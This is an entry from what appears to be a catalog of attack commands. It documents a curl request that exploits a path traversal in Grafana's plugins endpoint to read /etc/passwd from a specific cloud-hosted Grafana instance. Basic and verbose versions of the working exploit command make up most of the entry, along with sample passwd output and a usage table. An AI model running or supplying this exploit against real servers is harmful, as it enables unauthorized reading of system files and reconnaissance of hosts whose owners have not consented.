---
id: cmd-curl-etc-passwd
data: >-
  curl
  https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
tags:
  - path-traversal
  - recon
type: command
output: |-
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.761Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-etc-passwd

## Command

```bash
curl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## Description

Performs an HTTP GET request to exploit path traversal in Grafana's plugins endpoint, retrieving the contents of /etc/passwd to enumerate system users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target Grafana URL with encoded traversal path to /etc/passwd | Yes |

## Examples

### Basic Usage

```bash
curl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### Advanced Usage

Add -v for verbose output:

```bash
curl -v https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## Expected Output

Contents of /etc/passwd file, e.g., user entries like root:x:0:0:root:/root:/bin/bash followed by other accounts.

## Related

- [[Related Procedure: Exploit-Path-Traversal-to-Read-System-Files]]
